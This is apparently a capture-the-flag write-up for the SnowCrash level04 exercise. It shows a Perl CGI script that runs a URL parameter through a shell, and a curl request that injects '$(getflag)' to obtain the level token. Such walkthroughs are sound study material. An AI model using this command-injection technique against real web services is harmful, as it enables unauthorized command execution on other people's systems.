
in this level we get a file pl which is perl file

> we cat it to check the content:
--------------------------------
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
--------------------------------

> we tried to read the perl and understand the code first 
we got the hold of the code by searching:
https://www.tutorialspoint.com/perl/perl_subroutines.html

> so the function takes argument then echo whatever it's passed
but all this in the root side and not in level04 side. send a request to the port 4747

> so we need to inject a $(getflag) into the parameter x to get our flag:
--------------------------------
level04@SnowCrash:~$ curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
--------------------------------

> Good! now lt's get to our level:
--------------------------------
level04@SnowCrash:~$ su level05
Password:
level05@SnowCrash:~$
--------------------------------
